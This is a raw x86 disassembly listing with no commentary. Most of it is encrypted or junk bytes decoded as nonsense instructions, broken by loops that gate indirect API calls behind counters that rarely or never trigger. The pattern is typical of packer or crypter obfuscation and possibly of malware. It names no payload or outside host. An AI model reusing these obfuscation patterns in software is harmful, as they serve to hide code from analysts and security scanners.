  40ec65:	mov    edi,db0
  40ec68:	jno    0x40ecbe
  40ec6a:	dec    esp
  40ec6b:	popf   
  40ec6c:	pushf  
  40ec6d:	cld    
  40ec6e:	add    ecx,DWORD PTR [edi+0xacca1d3]
  40ec74:	xlat   BYTE PTR ds:[ebx]
  40ec75:	pop    eax
  40ec76:	push   ss
  40ec77:	sbb    al,0xd5
  40ec79:	sbb    esp,DWORD PTR [edx-0x319dbfe0]
  40ec7f:	loop   0x40ece5
  40ec81:	imul   ebx,DWORD PTR ds:0x4e84ce1d,0x6d
  40ec88:	dec    ecx
  40ec89:	mov    cl,0x8c
  40ec8b:	xchg   ecx,eax
  40ec8c:	pop    eax
  40ec8d:	and    BYTE PTR [edi],0xb0
  40ec90:	pushw  cs
  40ec92:	fdivr  DWORD PTR [ebx+0x6f9a519c]
  40ec98:	mov    edx,DWORD PTR ss:[ebp+0x8]
  40ec9c:	or     ecx,DWORD PTR ds:0x42a77d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	xchg   dl,ah
  40eda1:	inc    edx
  40eda2:	jmp    0x78b9ad08
  40eda7:	in     eax,0x7e
  40eda9:	js     0x40ee23
  40edab:	fdiv   QWORD PTR [eax]
  40edad:	les    eax,FWORD PTR [ebp+eax*8-0x6d407bda]
  40edb4:	js     0x40ee19
  40edb6:	jle    0x40ed7f
  40edb8:	sub    eax,0x15b68117
  40edbd:	cld    
  40edbe:	xor    dl,BYTE PTR [ebx]
  40edc0:	ins    BYTE PTR es:[edi],dx
  40edc1:	mov    dl,0x4b
  40edc3:	scas   al,BYTE PTR es:[edi]
  40edc4:	arpl   WORD PTR [ebp-0x805ee93],ax
  40edca:	pop    ds
  40edcb:	or     ebx,DWORD PTR [esi+0x2fb839b5]
  40edd1:	call   0xc26d:0x1db1
  40edd7:	data16 fadd QWORD PTR [esi]
  40edda:	jl     0x40ee4d
  40eddc:	jge    0x40ede7
  40edde:	sub    eax,0x221cc020
  40ede3:	arpl   WORD PTR [edi+edx*1+0x1e],ax
  40ede7:	adc    DWORD PTR cs:[ebx+eax*1],0xffffffb5
  40edec:	int    0xd9
  40edee:	dec    ebx
  40edef:	aas    
  40edf0:	jae    0x40ed96
  40edf2:	xchg   edx,eax
  40edf3:	adc    eax,0x3103f8ce
  40edf8:	fwait
  40edf9:	gs stos BYTE PTR es:[edi],al
  40edfb:	push   ss
  40edfc:	out    dx,al
  40edfd:	fidivr DWORD PTR [edx+0x5a]
  40ee00:	mov    cl,BYTE PTR [ebp-0x60bfc6ac]
  40ee06:	sub    bl,BYTE PTR [ecx]
  40ee08:	pop    edx
  40ee09:	neg    DWORD PTR [eax-0x57]
  40ee0c:	inc    edx
  40ee0d:	inc    edx
  40ee0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee0f:	xchg   ecx,eax
  40ee10:	ror    BYTE PTR [ecx+0x42eed2d2],cl
  40ee16:	in     eax,dx
  40ee17:	shl    DWORD PTR [edi],cl
  40ee19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee1a:	dec    ebx
  40ee1b:	or     al,0xc2
  40ee1d:	in     eax,0x71
  40ee1f:	fiadd  DWORD PTR [edx]
  40ee21:	or     eax,0x9be4d1bc
  40ee26:	jle    0x40ee42
  40ee28:	adc    al,0x6
  40ee2a:	mov    ds:0xb4e0b596,al
  40ee2f:	and    eax,0xcdb90909
  40ee34:	jmp    0x10555ceb
  40ee39:	sub    eax,0x13136087
  40ee3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee3f:	lea    esi,[edx+eax*8-0x12]
  40ee43:	loope  0x40ee21
  40ee45:	push   esp
  40ee46:	jne    0x40ee4f
  40ee48:	int3   
  40ee49:	sbb    DWORD PTR [ecx-0x4f],edi
  40ee4c:	cmp    al,0x53
  40ee4e:	dec    esi
  40ee4f:	push   ss
  40ee50:	(bad)  
  40ee52:	mov    ds:0x733683aa,al
  40ee57:	and    dh,BYTE PTR cs:[ebp-0x792a035c]
  40ee5e:	adc    ebp,0xa97cf679
  40ee64:	popa   
  40ee65:	lods   al,BYTE PTR ds:[esi]
  40ee66:	bound  esi,QWORD PTR [edi]
  40ee68:	adc    DWORD PTR [ebx-0x59cf894b],edi
  40ee6e:	inc    ebx
  40ee6f:	repnz enter 0x2818,0x5f
  40ee74:	(bad)  
  40ee75:	jb     0x40ee5c
  40ee77:	jg     0x40ee13
  40ee79:	ds ins DWORD PTR es:[edi],dx
  40ee7b:	stos   DWORD PTR es:[edi],eax
  40ee7c:	(bad)  
  40ee7d:	jmp    0xe757:0x54700c4e
  40ee84:	daa    
  40ee85:	xor    BYTE PTR [ebx+edx*1+0x69],cl
  40ee89:	daa    
  40ee8a:	xchg   DWORD PTR [edi-0x9],edx
  40ee8d:	cmp    edi,ebx
  40ee8f:	scas   eax,DWORD PTR es:[edi]
  40ee90:	pop    ecx
  40ee91:	mov    edi,0xd93cf0d3
  40ee96:	mov    cl,0xad
  40ee98:	inc    esp
  40ee99:	enter  0x82f4,0xe7
  40ee9d:	int    0xa2
  40ee9f:	mov    ch,BYTE PTR [ebp+0x4a3713f]
  40eea5:	dec    esp
  40eea6:	jl     0x40eea1
  40eea8:	sbb    eax,0xb70acb34
  40eead:	dec    esi
  40eeae:	aad    0xd4
  40eeb0:	je     0x40ef18
  40eeb2:	xor    DWORD PTR [eax-0xbf4b8e7],edx
  40eeb8:	xor    ecx,0xffffff8d
  40eebb:	xchg   edi,eax
  40eebc:	cmc    
  40eebd:	call   0x7f86b0a4
  40eec2:	outs   dx,DWORD PTR ds:[esi]
  40eec3:	aad    0xc
  40eec5:	rol    DWORD PTR [ecx+0x1e],0xa5
  40eec9:	jmp    0x283b:0x1b737136
  40eed0:	add    DWORD PTR [ecx+0x7e],0xffffff86
  40eed4:	(bad)  
  40eed5:	cli    
  40eed6:	cld    
  40eed7:	adc    DWORD PTR [ebx-0x29f0d279],ecx
  40eedd:	push   esp
  40eede:	push   edx
  40eedf:	add    al,0x52
  40eee1:	add    DWORD PTR [ecx+edx*8-0x66054b57],edx
  40eee8:	clc    
  40eee9:	pop    ds
  40eeea:	lock add al,BYTE PTR [eax]
  40eeed:	les    edi,FWORD PTR [eax+0x15]
  40eef0:	fwait
  40eef1:	clc    
  40eef2:	sub    al,BYTE PTR [ebx+eax*4+0x4ef9c1df]
  40eef9:	sar    edx,cl
  40eefb:	xchg   ebx,eax
  40eefc:	rol    DWORD PTR [ebx],0x50
  40eeff:	inc    ebx
  40ef00:	ja     0x40eea9
  40ef02:	push   edi
  40ef03:	iret   
  40ef04:	lds    esp,FWORD PTR [ebp-0x3]
  40ef07:	fist   WORD PTR [ebx-0x45]
  40ef0a:	out    dx,eax
  40ef0b:	jle    0x40ef2a
  40ef0d:	fld    DWORD PTR [edi+0x2c]
  40ef10:	ret    
  40ef11:	cli    
  40ef12:	push   cs
  40ef13:	test   al,0xa5
  40ef15:	adc    DWORD PTR ds:0xbb36f6b5,ecx
  40ef1b:	xchg   edi,eax
  40ef1c:	ss jbe 0x40eea0
  40ef1f:	and    cl,al
  40ef21:	sbb    ecx,DWORD PTR [ecx+ecx*2]
  40ef24:	pop    esi
  40ef25:	or     al,0x6b
  40ef27:	loopne 0x40ef87
  40ef29:	dec    esi
  40ef2a:	push   0x14
  40ef2c:	mov    edi,0x4ab3d9fe
  40ef31:	sbb    dl,BYTE PTR [edi-0x65]
  40ef34:	(bad)  
  40ef35:	mov    dh,0x92
  40ef37:	scas   eax,DWORD PTR es:[edi]
  40ef38:	add    eax,0x96e565bd
  40ef3d:	jecxz  0x40ef86
  40ef3f:	mov    dh,ah
  40ef41:	jmp    0x8ce94cd1
  40ef46:	arpl   WORD PTR ds:0x8d886842,si
  40ef4c:	jnp    0x40ef9a
  40ef4e:	cmp    al,0x21
  40ef50:	aas    
  40ef51:	jbe    0x40efc0
  40ef53:	in     eax,0x33
  40ef55:	or     eax,0x9f3fc033
  40ef5a:	dec    ecx
  40ef5b:	out    0x9c,al
  40ef5d:	ds retf 0xaeed
  40ef61:	mov    edi,0xfbd021ad
  40ef66:	sub    eax,0xfeb621c2
  40ef6b:	aam    0xe3
  40ef6d:	sahf   
  40ef6e:	lock mov ch,0x76
  40ef71:	push   esp
  40ef72:	test   DWORD PTR [eax+0x3afcb207],edx
  40ef78:	add    ecx,DWORD PTR [edx]
  40ef7a:	cmp    esp,edi
  40ef7c:	xor    ecx,DWORD PTR [esi+0x3d]
  40ef7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef80:	shr    DWORD PTR [ebp+0x7f],cl
  40ef83:	shl    BYTE PTR [edx-0x1d76d15c],1
  40ef89:	imul   ecx,eax,0x6e
  40ef8c:	pop    ds
  40ef8d:	fsubr  QWORD PTR [ebp-0x48]
  40ef90:	adc    dl,bh
  40ef92:	(bad)  
  40ef93:	jae    0x40ef17
  40ef95:	out    dx,al
  40ef96:	push   es
  40ef97:	lods   al,BYTE PTR ds:[esi]
  40ef98:	jmp    0x40efc2
  40ef9a:	dec    edi
  40ef9b:	xchg   edx,edx
  40ef9d:	daa    
  40ef9e:	call   0x5955:0x4114019
  40efa5:	mov    ebx,0x8e13036
  40efaa:	lods   eax,DWORD PTR ds:[esi]
  40efab:	rcl    DWORD PTR [eiz*2+0x436ef91e],cl
  40efb2:	jle    0x40ef4c
  40efb4:	nop
  40efb5:	push   esi
  40efb6:	or     esi,DWORD PTR [ebx+0x65]
  40efb9:	xchg   edx,eax
  40efba:	mov    edi,0xeec9714b
  40efbf:	mov    ds:0x247bf9fc,eax
  40efc4:	inc    esp
  40efc5:	pop    ebx
  40efc6:	shl    DWORD PTR [edi+0x10],cl
  40efc9:	lahf   
  40efca:	mov    al,0x26
  40efcc:	loopne 0x40efc4
  40efce:	pushf  
  40efcf:	packssdw mm5,QWORD PTR [edx]
  40efd2:	jecxz  0x40f03c
  40efd4:	mov    BYTE PTR [ecx+eax*2],cl
  40efd7:	sub    DWORD PTR [ecx],ebp
  40efd9:	fwait
  40efda:	pop    edx
  40efdb:	fidivr WORD PTR [ebp-0x2e]
  40efde:	imul   eax,ecx,0xffffffe6
  40efe1:	pop    DWORD PTR [edx-0x38]
  40efe4:	mov    ah,0x87
  40efe6:	and    DWORD PTR [ebp+0x22],ebx
  40efe9:	fwait
  40efea:	inc    esi
  40efeb:	scas   al,BYTE PTR es:[edi]
  40efec:	enter  0x59f6,0xa
  40eff0:	in     al,dx
  40eff1:	pop    ss
  40eff2:	cmp    ebp,edi
  40eff4:	(bad)  
  40eff5:	in     al,0x69
  40eff7:	dec    edx
  40eff8:	into   
  40eff9:	xchg   esi,eax
  40effa:	cmc    
  40effb:	mov    gs,WORD PTR [edi+0x3eda2135]
  40f001:	dec    esp
  40f002:	je     0x40eff1
  40f004:	push   0x24
  40f006:	mov    edx,0x50ec0845
  40f00b:	or     ax,0x86f2
  40f00f:	xor    ch,BYTE PTR [eax]
  40f011:	jmp    0x5589:0xbfe5ff91
  40f018:	clc    
  40f019:	and    DWORD PTR ds:0x42a801,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0xfe
  40f0d7:	fs inc ebp
  40f0d9:	mov    ecx,esi
  40f0db:	mov    esp,0x7ee57878
  40f0e0:	js     0x40f15a
  40f0e2:	and    DWORD PTR [ebx-0x5c],edi
  40f0e5:	or     DWORD PTR [edx+0x5ee20be2],ebp
  40f0eb:	das    
  40f0ec:	or     eax,0xdef0c915
  40f0f1:	int    0x17
  40f0f3:	add    al,0x81
  40f0f5:	cmp    ecx,DWORD PTR [edi]
  40f0f7:	add    eax,0xd36681a3
  40f0fc:	lods   eax,DWORD PTR ds:[esi]
  40f0fd:	xchg   BYTE PTR [ecx],bl
  40f0ff:	sub    al,0x4c
  40f101:	call   0xd68a:0x9f29e2cf
  40f108:	inc    ecx
  40f109:	cwde   
  40f10a:	cmp    DWORD PTR [esi],edi
  40f10c:	jl     0x40f0ff
  40f10e:	mov    dl,0x75
  40f110:	ror    DWORD PTR [ebp+0x56],cl
  40f113:	icebp  
  40f114:	add    bh,BYTE PTR [ebx+0x2c]
  40f117:	popa   
  40f118:	push   ecx
  40f119:	js     0x40f13e
  40f11b:	imul   esi
  40f11d:	(bad)  
  40f11e:	js     0x40f0d2
  40f120:	push   ecx
  40f121:	mov    dl,0xec
  40f123:	adc    BYTE PTR [eax+0x736f98e7],dl
  40f129:	aam    0x34
  40f12b:	push   esi
  40f12c:	xor    DWORD PTR [ecx+0x60c780e2],edx
  40f132:	in     eax,0xe5
  40f134:	ficomp WORD PTR [edx+0x76]
  40f137:	pop    ds
  40f138:	sbb    al,0x6d
  40f13a:	in     al,0x29
  40f13c:	aas    
  40f13d:	adc    BYTE PTR [eax-0x4e],cl
  40f140:	xor    ebx,DWORD PTR [edx+eax*4+0x33]
  40f144:	cmp    ch,BYTE PTR ds:0x79bd1cf1
  40f14a:	pop    esi
  40f14b:	(bad)  
  40f14c:	cmp    DWORD PTR [esi-0x31],ebp
  40f14f:	dec    esi
  40f150:	dec    ebx
  40f151:	scas   eax,DWORD PTR es:[edi]
  40f152:	add    edi,DWORD PTR [eax]
  40f154:	int    0x68
  40f156:	xchg   esi,eax
  40f157:	mov    edi,0x78f4b963
  40f15c:	lahf   
  40f15d:	push   eax
  40f15e:	outs   dx,BYTE PTR ds:[esi]
  40f15f:	jno    0x40f1c9
  40f161:	adc    ebp,ebp
  40f163:	mov    dl,0xc2
  40f165:	fucomip st,st(5)
  40f167:	and    ebp,ebp
  40f169:	lds    edx,FWORD PTR [edi+0x2bc0355c]
  40f16f:	test   BYTE PTR [esi+0x5d],0xbc
  40f173:	mov    ch,BYTE PTR [edx+0x3ad5ab28]
  40f179:	call   0xa2e0:0xad00f733
  40f180:	mov    WORD PTR [ebx],?
  40f182:	inc    ebp
  40f183:	adc    esi,DWORD PTR [edx+0x7f8823a3]
  40f189:	sub    bh,BYTE PTR [ecx+eax*8+0x297ae0d0]
  40f190:	sbb    BYTE PTR [eax+0x3ae083ef],bh
  40f196:	repnz adc BYTE PTR [ebp+0x17],0xf7
  40f19b:	xor    ebx,DWORD PTR [ebx]
  40f19d:	xor    eax,0xffd16a2e
  40f1a2:	sub    ah,BYTE PTR [eax+0x3c]
  40f1a5:	mov    ah,dh
  40f1a7:	nop
  40f1a8:	xchg   bl,bh
  40f1aa:	stos   BYTE PTR es:[edi],al
  40f1ab:	push   esi
  40f1ac:	inc    esp
  40f1ad:	jbe    0x40f186
  40f1af:	cmc    
  40f1b0:	mov    dh,0xb4
  40f1b2:	inc    ebp
  40f1b3:	ret    
  40f1b4:	mov    esi,0x2208c06b
  40f1b9:	(bad)  
  40f1ba:	mov    ds:0x5312c8f6,eax
  40f1bf:	(bad)  
  40f1c1:	loope  0x40f157
  40f1c3:	icebp  
  40f1c4:	push   0x98ef92d1
  40f1c9:	dec    edi
  40f1ca:	pop    ebx
  40f1cb:	es ins BYTE PTR es:[edi],dx
  40f1cd:	jl     0x40f154
  40f1cf:	nop
  40f1d0:	fistp  DWORD PTR [esi+0x342a8370]
  40f1d6:	scas   eax,DWORD PTR es:[edi]
  40f1d7:	inc    edi
  40f1d8:	icebp  
  40f1d9:	and    DWORD PTR [edi+0x445105f3],esi
  40f1df:	adc    ecx,DWORD PTR [ecx-0x218e8a42]
  40f1e5:	xchg   esi,eax
  40f1e6:	sub    al,0x10
  40f1e8:	pop    ds
  40f1e9:	mov    al,ds:0xab32a3
  40f1ee:	test   BYTE PTR [eax],ah
  40f1f0:	mov    al,ds:0xde3a824c
  40f1f5:	inc    edi
  40f1f6:	outs   dx,DWORD PTR ds:[esi]
  40f1f7:	imul   DWORD PTR [ebx]
  40f1f9:	inc    ebp
  40f1fa:	adc    bh,dh
  40f1fc:	jns    0x40f228
  40f1fe:	sbb    DWORD PTR [edx-0x26],ebx
  40f201:	jne    0x40f254
  40f203:	cld    
  40f204:	call   0x6ba4:0xc05da3cc
  40f20b:	and    ebp,DWORD PTR [bx+si+0x323c]
  40f210:	adc    esp,DWORD PTR [edi-0x34]
  40f213:	xor    DWORD PTR [edi+eiz*1-0x33],eax
  40f217:	xor    BYTE PTR ds:0xe7bc4952,al
  40f21d:	test   DWORD PTR [ecx-0x79],ecx
  40f220:	fld    TBYTE PTR [edi+eax*2-0x4a]
  40f224:	xchg   esi,eax
  40f225:	bnd jge 0x40f250
  40f228:	(bad)  
  40f229:	pop    edi
  40f22a:	je     0x40f1b3
  40f22c:	xchg   esi,eax
  40f22d:	xchg   BYTE PTR [eax+eax*8+0x76],cl
  40f231:	xor    eax,0xea8b21b7
  40f236:	jecxz  0x40f2a5
  40f238:	pushf  
  40f239:	inc    edi
  40f23a:	add    bh,dh
  40f23c:	fwait
  40f23d:	sbb    eax,0xc8bc97bf
  40f242:	mov    dl,0x39
  40f244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f245:	and    esi,DWORD PTR [edx]
  40f247:	dec    esp
  40f248:	int    0x18
  40f24a:	push   ecx
  40f24b:	aaa    
  40f24c:	repz (bad) 
  40f24e:	cmp    eax,0x41b5ea34
  40f253:	sbb    al,0xa
  40f255:	out    0x72,al
  40f257:	mov    ds:0xb57464c3,eax
  40f25c:	push   ss
  40f25d:	mov    ebx,0xf0f6fbf2
  40f262:	push   ds
  40f263:	mov    DWORD PTR [ebx-0x21],esi
  40f266:	mov    ch,0x96
  40f268:	addr16 std 
  40f26a:	lock inc ebp
  40f26c:	adc    eax,0x34308e69
  40f271:	ins    BYTE PTR es:[edi],dx
  40f272:	push   esp
  40f273:	repnz cmp eax,0x90e2e3d3
  40f279:	mov    BYTE PTR [ecx],dh
  40f27b:	mov    al,0x7e
  40f27d:	div    DWORD PTR [edi-0xa]
  40f280:	aam    0xbc
  40f282:	jo     0x40f279
  40f284:	pop    ds
  40f285:	inc    esi
  40f286:	nop
  40f287:	mov    eax,0x608e8dfa
  40f28c:	setno  dh
  40f28f:	retf   0x3c6
  40f292:	loopne 0x40f23d
  40f294:	jmp    0x8a994534
  40f299:	fsub   QWORD PTR [edi-0x1e]
  40f29c:	and    DWORD PTR [ebx],ebx
  40f29e:	xchg   DWORD PTR [edi-0x68],esp
  40f2a1:	cmp    eax,0xadfcf75
  40f2a6:	rcl    BYTE PTR [edx],0x72
  40f2a9:	adc    edx,esp
  40f2ab:	je     0x40f307
  40f2ad:	sub    al,0xcd
  40f2af:	int3   
  40f2b0:	mov    WORD PTR [edx-0xc],cs
  40f2b3:	jbe    0x40f31b
  40f2b5:	dec    ebp
  40f2b6:	xor    eax,DWORD PTR [ecx]
  40f2b8:	push   edx
  40f2b9:	(bad)  
  40f2ba:	(bad)  
  40f2bb:	std    
  40f2bc:	nop
  40f2bd:	pop    eax
  40f2be:	loopne 0x40f2fa
  40f2c0:	mul    DWORD PTR [ebx+0x1d27cd60]
  40f2c6:	and    eax,DWORD PTR [ecx*4+0x725ff18f]
  40f2cd:	mov    ecx,DWORD PTR [edx-0x31]
  40f2d0:	dec    ebp
  40f2d1:	bound  ebx,QWORD PTR [ebp-0x45d3d3b0]
  40f2d7:	lock xor BYTE PTR [ebx+eax*4+0x56d3835d],dh
  40f2df:	cwde   
  40f2e0:	int3   
  40f2e1:	rcl    BYTE PTR [edi-0x5df4046c],0xa2
  40f2e8:	sub    ah,BYTE PTR [edi]
  40f2ea:	cdq    
  40f2eb:	cmp    ecx,DWORD PTR [edi+edi*4+0x48]
  40f2ef:	xor    BYTE PTR [ecx+0x73d62ac8],dh
  40f2f5:	mov    ch,BYTE PTR [eax]
  40f2f7:	ja     0x40f322
  40f2f9:	gs mov dh,0x7b
  40f2fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2fd:	mov    al,bh
  40f2ff:	(bad)  
  40f300:	mov    ecx,0x84fcfca8
  40f305:	lods   al,BYTE PTR ds:[esi]
  40f306:	mov    ds:0x8b4608ec,eax
  40f30b:	xor    BYTE PTR [esi+0x0],cl
  40f30e:	loopne 0x40f2f9
  40f310:	scas   al,BYTE PTR es:[edi]
  40f311:	enter  0x1114,0xa0
  40f315:	imul   edi,DWORD PTR [esi],0xcd467592
  40f31b:	or     eax,0xef994259
  40f320:	outs   dx,DWORD PTR ds:[esi]
  40f321:	gs ret 
  40f323:	jbe    0x40f2d6
  40f325:	in     al,dx
  40f326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f327:	leave  
  40f328:	cs sbb ecx,ebx
  40f32b:	popa   
  40f32c:	sub    eax,0xd0bfae1b
  40f331:	pop    eax
  40f332:	js     0x40f329
  40f334:	rcr    DWORD PTR [esp+esi*8],cl
  40f337:	or     eax,0xa4a8a6b6
  40f33c:	mov    ecx,0x997d2d8b
  40f341:	or     DWORD PTR [esi+ecx*2+0xc],edi
  40f345:	repnz or BYTE PTR [eax+0x1ea277f6],dl
  40f34c:	inc    edx
  40f34d:	add    edx,ecx
  40f34f:	mov    DWORD PTR ds:0x42a80d,0x1d
  40f359:	cmp    DWORD PTR ds:0x42a80d,0x0
  40f360:	je     0x40f3c3
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	rcl    DWORD PTR [eax],0xad
  40f573:	pop    es
